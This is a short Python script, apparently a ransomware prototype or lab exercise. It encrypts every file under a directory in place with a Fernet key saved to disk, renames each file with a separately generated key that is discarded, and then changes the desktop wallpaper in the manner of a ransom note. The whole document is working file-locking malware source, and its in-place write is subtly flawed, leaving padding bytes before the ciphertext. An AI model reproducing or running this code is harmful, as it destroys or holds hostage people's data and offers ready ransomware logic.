from cryptography.fernet import Fernet as fernet
import os
import json

key = fernet.generate_key()
algo = fernet(key)

listeKey = {"keyFile": key.decode()}
jsonKey = json.dumps(str(listeKey)).encode('utf-8')

with open("/root/script/key.txt", "wb") as f:
    f.write(jsonKey)

for dirpath, dirnames, files in os.walk('/root/script/Private', topdown=False):
    print(f'Found directory: {dirpath}')
    for file_name in files:
        with open(dirpath+ "/" + file_name, "rb+") as f:
            data = f.read()
            f.truncate(0)
            f.write(algo.encrypt(data))
            print('Fichier chiffre:' + dirpath+ "/" + file_name)

        keyFilename = fernet.generate_key()
        algoFilename = fernet(keyFilename)

        encodeFileName = algoFilename.encrypt(file_name.encode())
        os.rename(dirpath+ "/" + file_name,dirpath+ "/" + encodeFileName.decode() + "")

os.system("/usr/bin/gsettings set org.gnome.desktop.background picture-uri /root/script/wp.png")
